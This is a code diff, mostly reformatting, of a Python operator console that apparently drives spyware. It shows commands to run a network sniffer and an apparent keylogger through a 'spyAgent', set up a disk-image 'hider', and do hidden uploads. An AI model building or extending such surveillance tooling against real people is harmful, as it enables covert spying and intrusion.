@@ -23,6 +23,7 @@ $ sniff 30
 def LOG(s: str):
     print(f"LOG: {s}")
 
+
 def print_res_str(res: tuple[Responce, bytes]):
     if type(res[0]) == tuple:
         res = res[0]
@@ -30,9 +31,10 @@ def print_res_str(res: tuple[Responce, bytes]):
     stri = res[1]
     if type(stri) == bytes:
         stri = stri.decode()
-    if stat != Status.SUCCSESS and stat != Status.DID_NOTHING or stri != '':
-        print(f'Status: {stat}')
-        print(f'String Response:\n---------------\n{stri}')    
+    if stat != Status.SUCCSESS and stat != Status.DID_NOTHING or stri != "":
+        print(f"Status: {stat}")
+        print(f"String Response:\n---------------\n{stri}")
+
 
 class Context:
     def __init__(self, operations):
@@ -278,7 +280,7 @@ class UI:
         net_driver = self.ctx.selected_operation.netDriver
         params = ContParams(SnifferType, Params(SniffParams(time, net_driver.encode())))
         res = self.ctx.selected_operation.spyAgent.runContraption(
-                params, self.ctx.cont_ident
+            params, self.ctx.cont_ident
         )
         print_res_str(res)
         self.ctx.cont_ident += 1
@@ -304,12 +306,12 @@ class UI:
         kligP = ContParams(KligerType, kligPar)
         ic(kligP)
         res = self.ctx.selected_operation.spyAgent.runContraption(
-                kligP, self.ctx.cont_ident
-            )
+            kligP, self.ctx.cont_ident
+        )
         print_res_str(res)
         self.ctx.cont_ident += 1
 
-    def setup(self, targetPath, imagePath='', mountPath=''):
+    def setup(self, targetPath, imagePath="", mountPath=""):
         """
         USAGE: setup <targetPath> <imagePath> <mountPath>
         Set hider path and other params in manager and spyware (if exists)
@@ -321,15 +323,16 @@ class UI:
         if not self.is_op_active():
             return
         res = self.ctx.selected_operation.managerAgent.hider_setup(
-                targetPath, imagePath, mountPath
-            )
+            targetPath, imagePath, mountPath
+        )
         print_res_str(res)
         LOG(f"Manager hider set")
         LOG(f"Manager mount set")
+        spyBasePath = "../"
         spy = self.ctx.selected_operation.spyAgent
         if not spy:
             return
-        res = spy.hider_setup(targetPath, imagePath, mountPath)
+        res = spy.hider_setup(spyBasePath + targetPath, imagePath, mountPath)
         print_res_str(res)
         LOG(f"Spyware hider set")
         LOG(f"Spyware mount set")
@@ -475,10 +478,10 @@ class UI:
         """
         if self.check_ready():
             res = self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
-                    FunCode.HIDDEN_UPLOAD,
-                    homePath,
-                    targetPath,
-                )
+                FunCode.HIDDEN_UPLOAD,
+                homePath,
+                targetPath,
+            )
             print_res_str(res)
             return res
 
@@ -497,8 +500,8 @@ class UI:
         self.uprun(spyHome, spyTarget)
         while not self.ctx.selected_operation.spyAgent:
             time.sleep(1)
-        self.setup(hiderTarg, 'img.iso', 'mont')
-        print('Done.')
+        self.setup(hiderTarg, "img.iso", "mont")
+        print("Done.")
 
     def list_ops_names(self):
         for op in self.ctx.oper_dict.values():
